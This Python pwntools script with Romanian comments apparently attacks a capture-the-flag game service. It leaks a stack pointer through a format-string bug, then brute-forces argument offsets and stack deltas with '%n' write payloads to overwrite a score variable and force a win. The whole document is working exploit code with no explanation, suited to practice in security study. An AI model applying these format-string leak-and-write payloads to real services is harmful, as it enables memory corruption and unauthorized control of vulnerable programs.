#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

HOST = "10.213.0.102"
PORT = 30470

# Testăm direct cu offset-urile pe care le știm
# Din output anterior: offset 4 = 0xff9a1580 (stack address)
# Scorul e la offset 15 (valoare 0x32)

p = remote(HOST, PORT)
p.recvuntil(b'hint:\n')

log.info("Testing with known information...")

# Testăm dacă putem scrie la offset 15 direct
# Problema: %15$n scrie LA ADRESA 0x32, nu suprascrie valoarea

# Altă idee: poate input-ul nu e la offset 40
# Hai să testăm manual offset-uri mici

for test_offset in [6, 7, 8, 9, 10, 11, 12]:
    try:
        p2 = remote(HOST, PORT, level='error')
        p2.recvuntil(b'hint:\n')
        
        # Skip
        p2.sendline(b'dummy')
        p2.recvuntil(b'hint:\n')
        
        # Leak stack
        p2.sendline(b'%4$p')
        data = p2.recvuntil(b'hint:\n').decode()
        stack_addr = int(data.split('pentru:\n')[1].split('Introdu')[0].strip(), 16)
        
        score_addr = stack_addr - 0x184
        
        # Test write cu acest offset
        payload = p32(score_addr) + f'%96c%{test_offset}$n'.encode()
        
        p2.sendline(payload)
        p2.recvuntil(b'hint:\n', timeout=1)
        p2.sendline(b'7')
        
        resp = p2.recvall(timeout=2)
        
        if b'Player wins' in resp or b'100' in resp:
            log.success(f"SUCCESS! Input offset is {test_offset}")
            print(resp.decode('utf-8', errors='replace'))
            p2.close()
            p.close()
            exit(0)
        
        p2.close()
    except Exception as e:
        log.debug(f"Offset {test_offset} failed: {e}")
        pass

log.warning("No offset worked, trying different stack offsets...")

# Dacă nu merge, încercăm diferite offset-uri de stack
for stack_delta in range(-0x200, -0x100, 8):
    try:
        p3 = remote(HOST, PORT, level='error')
        p3.recvuntil(b'hint:\n')
        
        p3.sendline(b'x')
        p3.recvuntil(b'hint:\n')
        
        p3.sendline(b'%4$p')
        data = p3.recvuntil(b'hint:\n').decode()
        stack_addr = int(data.split('pentru:\n')[1].split('Introdu')[0].strip(), 16)
        
        score_addr = stack_addr + stack_delta
        
        payload = p32(score_addr) + b'%96c%7$n'  # Presupunem offset 7
        
        p3.sendline(payload)
        p3.recvuntil(b'hint:\n', timeout=1)
        p3.sendline(b'7')
        
        resp = p3.recvall(timeout=1)
        
        if b'Player wins' in resp:
            log.success(f"SUCCESS! Stack delta: {hex(stack_delta)}")
            print(resp.decode('utf-8', errors='replace'))
            exit(0)
        
        p3.close()
    except:
        pass

p.close()
log.error("All attempts failed")